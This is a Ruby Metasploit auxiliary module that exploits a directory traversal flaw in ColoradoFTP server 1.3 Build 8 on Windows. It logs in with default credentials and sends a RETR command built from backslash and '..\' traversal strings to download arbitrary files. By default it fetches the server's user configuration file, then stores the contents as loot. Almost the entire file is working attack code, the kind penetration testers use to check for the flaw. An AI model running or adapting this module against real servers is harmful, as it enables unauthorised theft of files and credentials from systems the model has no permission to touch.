##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::Ftp
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'ColoradoFTP Server 1.3 Build 8 Directory Traversal Information Disclosure',
      'Description'    => %q{
        This module exploits a directory traversal vulnerability found in ColoradoFTP server
        version <= 1.3 Build 8. This vulnerability allows an attacker to download and upload arbitrary files
        from the server GET/PUT command including file system traversal strings starting with '\\\'.
        The server is writen in Java and therefore platform independant, however this vulnerability is only
        exploitable on the Windows version.
      },
      'Platform'       => 'win',
      'Author'         =>
        [
          'h00die <mike@shorebreaksecurity.com>',
          'RvLaboratory', #discovery
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'EDB', '40231'],
          [ 'URL', 'https://bitbucket.org/nolife/coloradoftp/commits/16a60c4a74ef477cd8c16ca82442eaab2fbe8c86']
        ],
      'DisclosureDate' => 'Aug 11 2016'
    ))

    register_options(
      [
        OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 2 ]),
        OptString.new('PATH', [ true, 'Path to the file to disclose, releative to the root dir.', 'conf\\xml-users.xml']),
        OptString.new('FTPUSER', [ true, 'Username to use for login', 'ftpuser']), #override default
        OptString.new('FTPPASS', [ true, 'Password to use for login', 'ftpuser123']) #override default
      ], self.class)

  end

  def check_host(ip)
    begin
      connect
      if /Welcome to ColoradoFTP - the open source FTP server \(www\.coldcore\.com\)/i === banner
        return Exploit::CheckCode::Appears
      end
    ensure
      disconnect
    end

    Exploit::CheckCode::Safe
  end

  def run_host(ip)
    begin
      connect_login
      sock = data_connect

      file_path = datastore['PATH']
      file = ::File.basename(file_path)

      # make RETR request and store server response message...
      retr_cmd = '\\\\\\' + ("..\\" * datastore['DEPTH'] ) + "#{file_path}"
      res = send_cmd( ["retr", retr_cmd], true)
      print_status(res)
      # read the file data from the socket that we opened
      response_data = sock.read(1024)

      unless response_data
        print_error("#{file} not found")
        return
      end

      if response_data.length == 0
        print_status("File (#{file_path})from #{peer} is empty...")
        return
      end

      # store file data to loot
      loot_file = store_loot("coloradoftp.ftp.data", "text", rhost, response_data, file, file_path)
      vprint_status("Data returned:\n")
      vprint_line(response_data)
      print_good("Stored #{file_path} to #{loot_file}")

    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout => e
      vprint_error(e.message)
      elog("#{e.class} #{e.message} #{e.backtrace * "\n"}")
    rescue ::Timeout::Error, ::Errno::EPIPE => e
      vprint_error(e.message)
      elog("#{e.class} #{e.message} #{e.backtrace * "\n"}")
    ensure
      data_disconnect
      disconnect
    end
  end
end
